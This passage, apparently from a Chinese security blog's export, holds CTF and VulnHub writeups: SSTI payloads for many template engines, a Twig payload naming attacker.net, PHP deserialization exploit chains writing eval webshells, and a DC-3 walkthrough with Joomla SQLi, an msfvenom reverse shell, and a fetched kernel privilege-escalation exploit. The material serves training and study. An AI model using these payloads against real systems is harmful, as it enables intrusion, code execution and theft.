&quot;xxxxxx&quot; in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0， param = a else: param = b print(&#x27;找到了利用文件： &#x27;+file+&quot; and 找到了利用的参数：%s&quot; %param) print(&#x27;结束时间： &#x27; + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 自己写了好久都没成功跑出来，也懒得再改了，直接参考大佬的exp [ASIS 2019]Unicorn shopwriteup找个unicode字符： https://www.compart.com/en/unicode 搜索thousand 随便找个 Numeric Value大于购买的价格 UTF-8 Encoding转换成url 即把0x替换成% 空格替换 买第四个 hackbar不知道为啥不行 payload: 参考： https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/ https://xz.aliyun.com/t/5402 [NCTF2019]True XML cookbookwriteupxxe 可以任意文件读取 读/flag /flag.txt /etc/hosts doLogin.php都没有啥 猜测flag在内网 读取arp表 扫描同网段其它机器","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"}]},{"title":"SSTI模板注入漏洞","slug":"SSTI模板注入漏洞","date":"2020-02-13T04:10:45.000Z","updated":"2021-02-21T14:25:49.288Z","comments":true,"path":"2020/02/13/SSTI模板注入漏洞/","link":"","permalink":"http://www.moonback.xyz/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"本篇博客主要介绍了服务端模板注入漏洞及其利用方式！","text":"本篇博客主要介绍了服务端模板注入漏洞及其利用方式！ 什么是模板注入？服务端模板注入(SSTI)，全称Server-Side Template Injection，与我们熟知的SQL注入、命令注入等原理大同小异，当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑。 常见的模板引擎各框架模板结构： PHPSmartySmarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function) 但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。 getStreamVariable() 12345678910111213141516171819public function getStreamVariable($variable)&#123; $_result = &#x27;&#x27;; $fp = fopen($variable, &#x27;r+&#x27;); if ($fp) &#123; while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123; $_result .= $current_line; &#125; fclose($fp); return $_result; &#125; $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) &#123; throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;); &#125; else &#123; return null; &#125;&#125; 因此我们可以用这个方法读文件，payload: 1&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125; class Smarty_Internal_Write_File 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class Smarty_Internal_Write_File&#123; /** * Writes file in a safe way to disk * * @param string $_filepath complete filepath * @param string $_contents file content * @param Smarty $smarty smarty instance * * @throws SmartyException * @return boolean true */ public function writeFile($_filepath, $_contents, Smarty $smarty) &#123; $_error_reporting = error_reporting(); error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING); if ($smarty-&gt;_file_perms !== null) &#123; $old_umask = umask(0); &#125; $_dirpath = dirname($_filepath); // if subdirs, create dir structure if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123; mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true); &#125; // write to tmp file, then move to overt file lock race condition $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true)); if (!file_put_contents($_tmp_file, $_contents)) &#123; error_reporting($_error_reporting); throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;); &#125; /* * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */ if (Smarty::$_IS_WINDOWS) &#123; // remove original file if (is_file($_filepath)) &#123; @unlink($_filepath); &#125; // rename tmp file $success = @rename($_tmp_file, $_filepath); &#125; else &#123; // rename tmp file $success = @rename($_tmp_file, $_filepath); if (!$success) &#123; // remove original file if (is_file($_filepath)) &#123; @unlink($_filepath); &#125; // rename tmp file $success = @rename($_tmp_file, $_filepath); &#125; &#125; if (!$success) &#123; error_reporting($_error_reporting); throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;); &#125; if ($smarty-&gt;_file_perms !== null) &#123; // set file permissions chmod($_filepath, $smarty-&gt;_file_perms); umask($old_umask); &#125; error_reporting($_error_reporting); return true; &#125;&#125; 可以看到writeFile函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型： 1234public function clearConfig($varname = null)&#123; return Smarty_Internal_Extension_Config::clearConfig($this, $varname);&#125; 因此我们可以构造payload写个webshell: 1&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125; 不同版本又有不同的差别 贴一些payload： 查看Smarty版本 1&#123;$smarty.version&#125; RCE 123&#123;system(&#x27;cat /flag&#x27;)&#125;&#123;php&#125;phpinfo();&#123;/php&#125;&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125; 读文件 1&#123;self::getStreamVariable(“file:///etc/passwd”)&#125; Twig相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 self:: 调用静态变量了，但是 通过官方文档的查询：Twig 给我们提供了一个 _self, 虽然 _self 本身没有什么有用的方法，但是却有一个 env。 env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来找到了Twig 的源码中的 environment.php） 因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞： payload: 1&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125; 但是新的问题出现了，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 getFilter() 这个函数中调用了一个 call_user_function 方法 123456789101112131415public function getFilter($name)&#123; [snip] foreach ($this-&gt;filterCallbacks as $callback) &#123; if (false !== $filter = call_user_func($callback, $name)) &#123;//注意这行 return $filter; &#125; &#125; return false;&#125;public function registerUndefinedFilterCallback($callable)&#123; $this-&gt;filterCallbacks[] = $callable;&#125; 我们只要把exec() 作为回调函数传进去就能实现命令执行了 payload: 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125; PythonDjango123def view(request, *args, **kwargs): template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;) return HttpResponse(template.format(user=request.user)) 注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，怎么办？ 可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？ p牛在自己的博客中分享了这个思路，我把它引用过来： Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项 什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标 后来发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件： 所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。 123?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; Flask/jinja2Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 举个例子： 1234567891011121314151617181920from flask import Flask, request, render_template_string, render_templateapp = Flask(__name__)@app.route(&#x27;/hello-template-injection&#x27;)def hello_ssti(): person = &#123;&#x27;name&#x27;:&quot;world&quot;, &#x27;secret&#x27;:&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;&#125; if request.args.get(&#x27;name&#x27;): person[&#x27;name&#x27;] = request.args.get(&#x27;name&#x27;) template = &#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27; % person[&#x27;name&#x27;] return render_template_string(template, person=person)def get_user_file(f_name): with open(f_name) as f: return f.readlines() app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_fileif __name__ == &quot;__main__&quot;: app.debug = True app.run(host=&quot;0.0.0.0&quot;) 我们就可以SSTI将secret泄露出来 1hello-template-injection?name&#x3D;MoonBack.&#123;&#123;person.secret&#125;&#125; 同样我们可以用get_user_file读取文件 假设我们用下面的payload: 1&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;ipconfig&#39;).read()&#125;&#125; 我们就可以成功执行命令 而漏洞点就存在于： 12template = &#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27; % person[&#x27;name&#x27;]return render_template_string(template, person=person) 如果改成 1234567891011from flask import Flask, request, render_templateapp = Flask(__name__)@app.route(&#x27;/hello-template-injection&#x27;)def hello_ssti(): person = &#123;&#x27;name&#x27;:&quot;world&quot;, &#x27;secret&#x27;:&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;&#125; if request.args.get(&#x27;name&#x27;): person[&#x27;name&#x27;] = request.args.get(&#x27;name&#x27;) return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,username=person[&#x27;name&#x27;])if __name__ == &quot;__main__&quot;: app.debug = True app.run(host=&quot;0.0.0.0&quot;) 再在templates目录里写入index.html 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, &#123;&#123;username&#125;&#125;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 再访问发现就没能成功解析出secret 漏洞成因在于：render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，两个大括号在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把两个大括号包裹的内容当做变量解析替换。 获取全局配置文件 config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。 12345&#123;&#123;config&#125;&#125;&#123;&#123;person.secret&#125;&#125;&#123;&#123;self.__dict__&#125;&#125;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; 命令执行 直接用Vlunhub上的exp：https://github.com/vulhub/vulhub/tree/master/flask/ssti 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Tornado参见护网杯的一道题：https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado JavafreeMarker这个模板主要用于 java ,粗略得知new会导致安全问题，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象 payload： 123&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;&lt;#assignob=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125; VelocityVelocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 安全问题 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）： 这幅图中，被高亮的 class 能返回对象，看上去十分有趣。谷歌一下，我们发现了如下描述：ClassTool：在模板中实现Java的反射，默认参数：$key 这里有几个可利用的方法和属性：$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例$class.type：返回被审查的类 换句话说，我们可以通过这两个类获得任意对象信息。再利用目标的Runtime.exec()执行任意命令嗯。通过如下模板，我们可以验证这一点： 1$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() //延迟了5秒 得到 shell 命令输出有点麻烦（毕竟java）： 12345678910#set($str=$class.inspect(&quot;java.lang.String&quot;).type)#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end //输出 tomcat7 Node.jsEJSEJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML 页面 文档参见：https://ejs.bootcss.com/#docs 标签含义 &lt;% ‘脚本’ 标签，用于流程控制，无输出。 &lt;%_ 删除其前面的空格符 &lt;%= 输出数据到模板（输出是转义 HTML 标签） &lt;%- 输出非转义的数据到模板 &lt;%# 注释标签，不执行、不输出内容 &lt;%% 输出字符串 ‘&lt;%’ %&gt; 一般结束标签 -%&gt; 删除紧随其后的换行符 _%&gt; 将结束标签后面的空格符删除 贴一下payload： 命令执行 1&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat app.js&#x27;) %&gt; 参考： https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ssti","slug":"ssti","permalink":"http://www.moonback.xyz/tags/ssti/"}]},{"title":"buuctf新春红包题writeup","slug":"buuctf新春红包题writeup","date":"2020-02-10T06:03:27.000Z","updated":"2020-10-05T06:51:49.436Z","comments":true,"path":"2020/02/10/buuctf新春红包题writeup/","link":"","permalink":"http://www.moonback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/","excerpt":"记一下题目的writeup，收获很多！太菜了，那麽多方法一个不会！😭","text":"记一下题目的writeup，收获很多！太菜了，那麽多方法一个不会！😭 writeup题目原型为thinkphp 6.0反序列化，改自于2019高校运维赛ezpop,增加了点难度 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; // 使缓存文件名随机 $cache_filename = $this-&gt;options[&#x27;prefix&#x27;] . uniqid() . $name; if(substr($cache_filename, -strlen(&#x27;.php&#x27;)) === &#x27;.php&#x27;) &#123; die(&#x27;?&#x27;); &#125; return $cache_filename; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return $filename; &#125; return null; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); 先介绍几个概念，POP，全称面向属性编程（Property-Oriented Programing，常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。POP 链的构造就是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。 POP链：A::__destruct()=&gt;A::save()=&gt;A::store-&gt;set()==b::set()最后触发$result = file_put_contents($filename, $data); 分析一下： 反序列化操作会执行__destruct()方法，B类没有该方法，而A类中有，所以我们跟进A类的__destruct()方法，发现$this-&gt;autosave为空或者0或false时执行$this-&gt;save()方法 跟进第一行代码发现执行$this-&gt;getForStorage()，函数里又执行了$this-&gt;cleanContents()，传参为数组，再跟进，首先进行了反转键值的操作，遍历传过来的数组参数，如果该数组的值仍为数组，取与反转键值后新数组键名的交集存在$contents数组里，键为$contents的键，然后将$this-&gt;complete和完成上面操作的新数组json编码返回 跟进第二行代码，发现执行了某个对象的set方法，传了三个参数，我们可以将对象设为B，跟进，首先判断$expire是否为空，为空则取$this-&gt;options[&#39;expire&#39;]，然后调用了$this-&gt;getExpireTime()方法，该方法将传的参数强制int转换，然后调用了$this-&gt;getCacheKey()方法，生成一个$this-&gt;options[&#39;prefix&#39;]，微秒级时间戳和传过来参数拼接成的文件名，并且传过来的参数不能是.php,然后没有则创建文件夹，若传入的第二个参数是数字，就返回string类型转换的结果，否则返回$this-&gt;options[&#39;serialize&#39;]($data)，压缩数据，最后一个死亡退出，拼接序列化的结果写入拼接成的文件内 大概思路已经清晰，bypass一些限制： 文件名那里可以用.php/.而绕过 死亡退出那个地方可以用伪协议php://filter/write=convert.base64-decode/resource进行base64解码写入，可将shell先base64编码，注意要先把前半部分补齐去掉&lt;?;&gt;()这些无法被base64解码的字符，php//exit一共9个字符，再加上12个0，共21个，base64编码4个一组，因此我们需要再加3个 以上是ezpop的思路，题目的变量便是文件名不可控，有三种思路： 方式1(system)参见安全客文章:https://www.anquanke.com/post/id/194036 exp:(类加上就行) 123456$testB = new B();$testB-&gt;options[&#x27;serialize&#x27;] = &#x27;system&#x27;;$testA = new A($testB, &quot;miao&quot;);$testA-&gt;autosave = 0;$testA-&gt;cache = [&#x27;aaq&#x27; =&gt; &#x27;`cat /flag &gt; ./flag.xml`&#x27;];echo urlencode(serialize($testA)).&quot;\\n&quot;; 首先autosave要为0，$testB-&gt;options[&#39;serialize&#39;]要为system函数，此时我们对最后的写文件没什莫要求了，但必须要执行到$data = $this-&gt;serialize($value);这步，$testA-&gt;cache要为system要执行的命令 方式2(/../绕过)其实可以直接这样绕过，时间戳将会被认为一个目录，exp(加上类)： 123456789$b = new B();$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;);$a = new A($store = $b, $key = &quot;/../a.php/.&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); 方式3(.user.ini)其实这个也是上面的思路，主要还是跨目录的缘故，如果.php不知道怎末绕可以用这种思路，exp(加上类): 上传图片： 12345678910$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../aaaaaa.jpg&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); 上传.user.ini: 12345678910$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../.user.ini&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&quot;\\nauto_prepend_file=aaaaaa.jpg&quot;));echo urlencode(serialize($a)); 参考： https://www.zhaoj.in/read-6397.html http://althims.com/2020/01/29/buu-new-year/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pop","slug":"pop","permalink":"http://www.moonback.xyz/tags/pop/"}]},{"title":"VulnHub之DC-3靶机","slug":"VulnHub之DC-3靶机","date":"2020-02-06T07:17:26.000Z","updated":"2020-02-09T14:24:17.901Z","comments":true,"path":"2020/02/06/VulnHub之DC-3靶机/","link":"","permalink":"http://www.moonback.xyz/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/","excerpt":"本篇博客主要介绍了玩DC-3靶机的过程！","text":"本篇博客主要介绍了玩DC-3靶机的过程！ kali：192.168.17.146 靶机：192.168.17.137 writeup打开是这样的 英语翻译一下的大概意思就是只有一个flag，并且只有获得root才能获得flag dirsearch扫一下，在README.txt看到是Joomla3.7 搜了搜，发现Joomla3.7.0有sql注入漏洞，payload: 1index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x3e,database()),0) 直接用sqlmap跑 跑出来账号密码 显然这个密码是经过某种加密的，用john解密，先将加密的字符串写到hash这个文件内 解出来是snoopy，登陆后台，地址：/administrator/index.php 发现可以新建修改文件，直接用msf生成一个php的meterpreter 1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.17.146 -f raw &gt; shell.php 路径位于/templates/beez3/shell.php，msf监听 1234use exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.17.146run 然后访问，成功拿到shell 拿到的是www权限，想办法提权，进入shell，看下版本，发现是Ubuntu 16.04 1234uname -acat /proc/versioncat /etc/issuecat /etc/redhat-release searchsploit查找提权漏洞 选择用这个4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation 123456wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zipunzip 39772.ziptar -xvf exploit.tarcd ebpf_mapfd_doubleput_exploit./compile.sh #会报错，忽略就行./doubleput 得到flag 用php的meterpreter感觉真的不太好，不知道为啥断了好几次 推荐使用weevely，用法： 12weevely generate 1 a.php #生成密码为1的php后门weevely http://127.0.0.1/a.php 1 #连接","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.moonback.xyz/tags/VulnHub/"},{"name":"靶机","slug":"靶机","permalink":"http://www.moonback.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"preg_replace与代码执行","slug":"preg-replace与代码执行","date":"2020-01-31T04:15:59.000Z","updated":"2020-01-31T13:46:54.601Z","comments":true,"path":"2020/01/31/preg-replace与代码执行/","link":"","permalink":"http://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"之前这个知识点不知道，记录一下！","text":"之前这个知识点不知道，记录一下！ preg_replace()函数先看下php手册 函数说明：该函数执行一个正则表达式的搜索和替换 1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 搜索subject中匹配pattern的部分， 以replacement进行替换。 对于第二个参数，php手册上这样说明 在最后一段中我们可以看到，如果加上e修饰符就可以导致代码执行，注意这个有版本限制，php7版本将无法执行 一个简单的例子123&lt;?phppreg_replace(&quot;/t/e&quot;, $_GET[&quot;a&quot;], &quot;test&quot;);?&gt; 在php5.6成功执行如上结果，发现要替换的t有两个位置，var_dump(1)就执行两次，因此要想执行代码，第三个参数必须存在第一个参数正则的字符 一道CTF题目1234567&lt;?phpfunction complex($re, $str) &#123; return preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$str);&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125; 按照上面的思路，这里的preg_replace函数的第二个参数已经固定为&#39;strtolower(&quot;\\\\1&quot;)&#39; 字符串，strtolower函数的作用是将字符串转化为小写，那这样要如何执行代码呢？ 上面的命令执行，相当于eval(&#39;strtolower(&quot;\\\\1&quot;);&#39;) 结果，当中的 \\\\1 实际上就是 \\1 ，而 \\1 在正则表达式中有自己的含义。 反向引用: 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 所以这里的\\\\1代表的是第一个子匹配项，但是有此也只是仅仅能执行将第一个子匹配项全部变成小写，也无法代码执行啊，这里，我们需要先了解一下php可变变量的概念： 在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行 举个例子： 双引号例子，可以看到phpinfo已经成功解析 单引号例子，phpinfo没能解析 前面的\\\\1正是位于双引号中，如此，我们可以尝试构造如下payload： 1?.*=$&#123;phpinfo()&#125; 但这是还有个问题，由于php字符串解析特性，.会替换成_，具体参见：https://xz.aliyun.com/t/2557 如此，我们构造的payload: 123?\\S*=$&#123;phpinfo()&#125;或者?\\S*=&#123;$&#123;phpinfo()&#125;&#125; \\S在正则表达式中表示任何非空白字符，等价于 [^ \\f\\n\\r\\t\\v] 总之，坑很多！ 分析一下代码执行的流程，$&#123;phpinfo()&#125;中的 phpinfo()会被当做变量先执行，执行后，即变成 $&#123;1&#125; (phpinfo()成功执行返回true) 看几个例子： 123456var_dump(phpinfo()); // 布尔truevar_dump(strtolower(phpinfo()));// 字符串&#x27;1&#x27;,phpinfo执行成功返回1，将1小写var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;1&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));//字符串&#x27;11&#x27;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 